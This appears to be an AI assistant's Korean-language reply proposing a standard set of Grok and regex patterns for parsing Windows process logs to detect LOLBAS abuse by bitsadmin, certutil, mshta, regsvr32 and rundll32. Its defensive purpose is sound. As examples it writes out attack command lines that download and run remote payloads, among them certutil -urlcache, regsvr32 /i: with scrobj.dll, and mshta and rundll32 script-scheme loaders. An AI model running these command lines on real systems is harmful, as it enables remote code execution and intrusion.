좋습니다.
아래처럼 **LOLBAS 공통 파싱 표준안** 형태로 정리하면 운영에 가장 유리합니다.

핵심 원칙은 같습니다.

* **트리거**: 어떤 LOLBAS 실행인지 식별
* **대상 필드**: `CommandLine`
* **파싱 목적**: 악성 흔적이 될 수 있는 핵심 값 추출
* **출력 필드**: URL, 로컬 저장 경로, 스크립트 경로, DLL 경로, export 함수명 등

---

# LOLBAS CommandLine Grok 패턴 표준안

## 1. 공통 설계 원칙

### 1-1. 트리거 필드

다음 중 하나로 트리거를 겁니다.

* `NewProcessName`
* `Image`
* `ProcessPath`
* `CommandLine`

권장:

* 1차: `NewProcessName` 또는 `Image` 로 실행 파일 식별
* 2차: `CommandLine` 로 세부 행위 파싱

---

### 1-2. 대상 필드

```text
CommandLine
```

---

### 1-3. 결과 필드 표준

가능하면 추출 결과 필드명을 통일합니다.

| 필드명             | 의미               |
| --------------- | ---------------- |
| `lolbas_name`   | LOLBAS 실행 파일명    |
| `lolbas_action` | 주요 행위            |
| `remote_src`    | 외부/원격 소스         |
| `local_dst`     | 로컬 저장 경로         |
| `script_path`   | 실행 또는 로드 대상 스크립트 |
| `dll_path`      | 로드 대상 DLL        |
| `export_func`   | DLL export 함수    |
| `target_path`   | 주요 대상 파일/경로      |
| `raw_args`      | 세부 인자 원문         |

---

### 1-4. Grok 작성 원칙

운영 중에는 `%{WORD}` 같은 기본 패턴만으로는 Windows 경로 처리가 불안정할 수 있으므로,
**Grok + 정규식 혼합 방식**이 가장 안정적입니다.

예:

```text
%{DATA:prefix}(?<target_path>[A-Za-z]:\\[^"]+)
```

또는

```text
(?<target_path>[A-Za-z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]+)
```

---

# 2. bitsadmin 표준안

## 2-1. 주요 공격 행위

* `/transfer` 로 원격 파일 다운로드
* ADS 포함 URL/파일명 사용
* 다운로드 후 `.vbs`, `.js`, `.ps1`, `.exe`, `.dll` 생성

---

## 2-2. 트리거

```text
NewProcessName endswith \bitsadmin.exe
AND CommandLine contains /transfer
```

---

## 2-3. 예시

```text
bitsadmin /transfer mydownload http://example.com/download.log:evil.vbs C:\temp\local.vbs
```

---

## 2-4. Grok/정규식 표준 패턴

```regex
(?i)(?<lolbas_name>bitsadmin)\s+(?<lolbas_action>/transfer)\s+(?<job_name>\S+)\s+(?<remote_src>\S+)\s+(?<local_dst>.+)$
```

---

## 2-5. 추출 필드

* `lolbas_name`
* `lolbas_action`
* `job_name`
* `remote_src`
* `local_dst`

---

## 2-6. 운영 포인트

특히 아래 조합은 위험도가 높습니다.

* `remote_src` 에 `:`
* `remote_src` 또는 `local_dst` 가 `.vbs`, `.js`, `.ps1`, `.hta`, `.exe`, `.dll`

---

# 3. certutil 표준안

## 3-1. 주요 공격 행위

* `-urlcache -split -f` 로 외부 파일 다운로드
* Base64 인코딩/디코딩
* 인증서 유틸리티 위장 악용

---

## 3-2. 주요 케이스 A: 다운로드

### 예시

```text
certutil.exe -urlcache -split -f http://example.com/a.exe C:\temp\a.exe
```

### 트리거

```text
NewProcessName endswith \certutil.exe
AND CommandLine contains -urlcache
```

### 패턴

```regex
(?i)(?<lolbas_name>certutil(?:\.exe)?)\s+(?<raw_args>.*?-urlcache.*?-f)\s+(?<remote_src>\S+)\s+(?<local_dst>.+)$
```

### 추출 필드

* `lolbas_name`
* `raw_args`
* `remote_src`
* `local_dst`

---

## 3-3. 주요 케이스 B: 디코딩

### 예시

```text
certutil.exe -decode C:\temp\enc.txt C:\temp\payload.exe
```

### 트리거

```text
NewProcessName endswith \certutil.exe
AND CommandLine contains -decode
```

### 패턴

```regex
(?i)(?<lolbas_name>certutil(?:\.exe)?)\s+(?<lolbas_action>-decode)\s+(?<src_path>\S+)\s+(?<local_dst>.+)$
```

### 추출 필드

* `lolbas_name`
* `lolbas_action`
* `src_path`
* `local_dst`

---

## 3-4. 주요 케이스 C: 디코드헥스/인코드

환경에 따라 `-decodehex`, `-encode`, `-encodehex` 도 같이 관리할 수 있습니다.

```regex
(?i)(?<lolbas_name>certutil(?:\.exe)?)\s+(?<lolbas_action>-(?:decode|decodehex|encode|encodehex))\s+(?<src_path>\S+)\s+(?<local_dst>.+)$
```

---

# 4. mshta 표준안

## 4-1. 주요 공격 행위

* 원격 HTA 직접 실행
* 로컬 HTA/VBS/JS 실행
* `vbscript:` `javascript:` 스킴 실행
* 인메모리형 스크립트 실행

---

## 4-2. 주요 케이스 A: 원격/로컬 HTA 실행

### 예시

```text
mshta.exe http://example.com/payload.hta
```

```text
mshta.exe C:\temp\payload.hta
```

### 트리거

```text
NewProcessName endswith \mshta.exe
```

### 패턴

```regex
(?i)(?<lolbas_name>mshta(?:\.exe)?)\s+(?<target_path>.+)$
```

### 추출 필드

* `lolbas_name`
* `target_path`

---

## 4-3. 주요 케이스 B: script scheme 실행

### 예시

```text
mshta.exe vbscript:Close(Execute("GetObject(""script:http://example.com/x.sct"")"))
```

### 패턴

```regex
(?i)(?<lolbas_name>mshta(?:\.exe)?)\s+(?<script_path>(?:vbscript|javascript):.+)$
```

### 추출 필드

* `lolbas_name`
* `script_path`

---

## 4-4. 운영 포인트

`mshta` 는 인자가 매우 자유롭기 때문에, 1차는 넓게 잡고 2차 정규화가 좋습니다.

우선 추출:

* `target_path`

후속 세부 분석:

* URL 여부
* `.hta`, `.sct`, `.js`, `.vbs`
* `vbscript:` / `javascript:`
* `http://`, `https://`, `file://`

---

# 5. regsvr32 표준안

## 5-1. 주요 공격 행위

* DLL 등록
* `/i:<url>` + `scrobj.dll` 조합
* 원격 SCT 실행

---

## 5-2. 주요 케이스 A: 원격 SCT 실행

### 예시

```text
regsvr32.exe /s /n /u /i:http://example.com/test.sct scrobj.dll
```

### 트리거

```text
NewProcessName endswith \regsvr32.exe
```

### 패턴

```regex
(?i)(?<lolbas_name>regsvr32(?:\.exe)?)\s+(?<raw_args>.*?)(?:/i:(?<remote_src>\S+))\s+(?<dll_path>\S+)$
```

### 추출 필드

* `lolbas_name`
* `raw_args`
* `remote_src`
* `dll_path`

---

## 5-3. 주요 케이스 B: 일반 DLL 등록/실행

### 예시

```text
regsvr32.exe /s C:\temp\evil.dll
```

### 패턴

```regex
(?i)(?<lolbas_name>regsvr32(?:\.exe)?)\s+(?<raw_args>.*?)(?<dll_path>[A-Za-z]:\\.+\.dll)\s*$
```

### 추출 필드

* `lolbas_name`
* `raw_args`
* `dll_path`

---

## 5-4. 운영 포인트

우선순위는 높습니다.

특히 위험:

* `/i:http`
* `scrobj.dll`
* `.sct`
* 원격 URL

---

# 6. rundll32 표준안

## 6-1. 주요 공격 행위

* DLL + export 함수 실행
* JavaScript/VBScript 경유
* URL handler 악용
* CPL/DLL 실행

---

## 6-2. 주요 케이스 A: DLL export 실행

### 예시

```text
rundll32.exe C:\temp\evil.dll,EntryPoint
```

### 트리거

```text
NewProcessName endswith \rundll32.exe
```

### 패턴

```regex
(?i)(?<lolbas_name>rundll32(?:\.exe)?)\s+(?<dll_path>[^,]+),(?<export_func>[^\s]+)(?:\s+(?<raw_args>.*))?$
```

### 추출 필드

* `lolbas_name`
* `dll_path`
* `export_func`
* `raw_args`

---

## 6-3. 주요 케이스 B: JavaScript/VBScript 경유

### 예시

```text
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://example.com/payload.sct")
```

### 패턴

```regex
(?i)(?<lolbas_name>rundll32(?:\.exe)?)\s+(?<script_path>(?:javascript|vbscript):.+)$
```

### 추출 필드

* `lolbas_name`
* `script_path`

---

## 6-4. 주요 케이스 C: CPL 실행

### 예시

```text
rundll32.exe shell32.dll,Control_RunDLL C:\temp\evil.cpl
```

### 패턴

```regex
(?i)(?<lolbas_name>rundll32(?:\.exe)?)\s+(?<dll_path>[^,]+),(?<export_func>[^\s]+)\s+(?<target_path>.+)$
```

### 추출 필드

* `lolbas_name`
* `dll_path`
* `export_func`
* `target_path`

---

# 7. 통합 표준 테이블

| LOLBAS            | 트리거                                        | 핵심 추출 필드                       | 표준 패턴                                                                                                                     |                 |
| ----------------- | ------------------------------------------ | ------------------------------ | ------------------------------------------------------------------------------------------------------------------------- | --------------- |
| bitsadmin         | `bitsadmin.exe` + `/transfer`              | `remote_src`, `local_dst`      | `(?i)(?<lolbas_name>bitsadmin)\s+(?<lolbas_action>/transfer)\s+(?<job_name>\S+)\s+(?<remote_src>\S+)\s+(?<local_dst>.+)$` |                 |
| certutil download | `certutil.exe` + `-urlcache`               | `remote_src`, `local_dst`      | `(?i)(?<lolbas_name>certutil(?:\.exe)?)\s+(?<raw_args>.*?-urlcache.*?-f)\s+(?<remote_src>\S+)\s+(?<local_dst>.+)$`        |                 |
| certutil decode   | `certutil.exe` + `-decode`                 | `src_path`, `local_dst`        | `(?i)(?<lolbas_name>certutil(?:\.exe)?)\s+(?<lolbas_action>-decode)\s+(?<src_path>\S+)\s+(?<local_dst>.+)$`               |                 |
| mshta             | `mshta.exe`                                | `target_path` 또는 `script_path` | `(?i)(?<lolbas_name>mshta(?:\.exe)?)\s+(?<target_path>.+)$`                                                               |                 |
| regsvr32 sct      | `regsvr32.exe`                             | `remote_src`, `dll_path`       | `(?i)(?<lolbas_name>regsvr32(?:\.exe)?)\s+(?<raw_args>.*?)(?:/i:(?<remote_src>\S+))\s+(?<dll_path>\S+)$`                  |                 |
| rundll32 dll      | `rundll32.exe`                             | `dll_path`, `export_func`      | `(?i)(?<lolbas_name>rundll32(?:\.exe)?)\s+(?<dll_path>[^,]+),(?<export_func>[^\s]+)(?:\s+(?<raw_args>.*))?$`              |                 |
| rundll32 script   | `rundll32.exe` + `javascript:`/`vbscript:` | `script_path`                  | `(?i)(?<lolbas_name>rundll32(?:.exe)?)\s+(?<script_path>(?:javascript                                                     | vbscript):.+)$` |

---

# 8. 실무 적용 시 주의점

## 8-1. 따옴표 처리

실제 Windows 로그는 아래처럼 들어올 수 있습니다.

```text
"C:\Windows\System32\rundll32.exe" "C:\temp\evil.dll",EntryPoint
```

또는

```text
bitsadmin /transfer job "http://example.com/a.exe" "C:\temp\a.exe"
```

그래서 운영용 패턴은 **비인용형 / 인용형** 두 개를 준비하는 것이 좋습니다.

---

## 8-2. 1개 패턴으로 모두 처리하려고 하지 말기

`mshta`, `rundll32`, `regsvr32` 는 변형이 많아서
**행위별 서브패턴**으로 나누는 방식이 더 안정적입니다.

예:

* `RUNDLL32_DLL_EXPORT`
* `RUNDLL32_SCRIPT_SCHEME`
* `REGSVR32_REMOTE_SCT`
* `REGSVR32_LOCAL_DLL`

---

## 8-3. 추출 후 후처리 필수

정규식만으로 끝내지 말고 후처리 단계에서 아래를 붙이는 것이 좋습니다.

* URL 여부
* ADS 포함 여부 (`:`)
* 확장자 추출
* 경로 정규화
* `%TEMP%`, `%APPDATA%`, `C:\Users\Public\` 여부
* 스크립트 확장자 여부 (`.vbs`, `.js`, `.hta`, `.ps1`, `.sct`)

---

# 9. 운영용 권장 구조

## 9-1. 룰 정의 예시

```text
RuleName: LOLBAS_BITSADMIN_TRANSFER
Trigger:
  NewProcessName endswith \bitsadmin.exe
  AND CommandLine contains /transfer
TargetField:
  CommandLine
Parser:
  (?i)(?<lolbas_name>bitsadmin)\s+(?<lolbas_action>/transfer)\s+(?<job_name>\S+)\s+(?<remote_src>\S+)\s+(?<local_dst>.+)$
Output:
  lolbas_name
  lolbas_action
  job_name
  remote_src
  local_dst
```

---

## 9-2. 공통 출력 포맷 권장

모든 LOLBAS 룰이 아래처럼 나오게 맞추면 좋습니다.

```json
{
  "lolbas_name": "bitsadmin",
  "lolbas_action": "/transfer",
  "remote_src": "http://example.com/download.log:evil.vbs",
  "local_dst": "C:\\temp\\local.vbs"
}
```

---

# 10. 추천 결론

이번 작업은 아래 구조로 표준화하는 것이 좋습니다.

## A. 1차 분류

* `bitsadmin`
* `certutil`
* `mshta`
* `regsvr32`
* `rundll32`

## B. 2차 행위 분류

* download
* decode
* script execution
* remote sct
* dll export
* cpl execution

## C. 3차 추출

* `remote_src`
* `local_dst`
* `script_path`
* `dll_path`
* `export_func`

---

원하시면 다음 단계로 이어서
**인용부호 포함 Windows CommandLine까지 대응한 운영용 최종 패턴 v2** 형태로 더 촘촘하게 정리해 드리겠습니다.
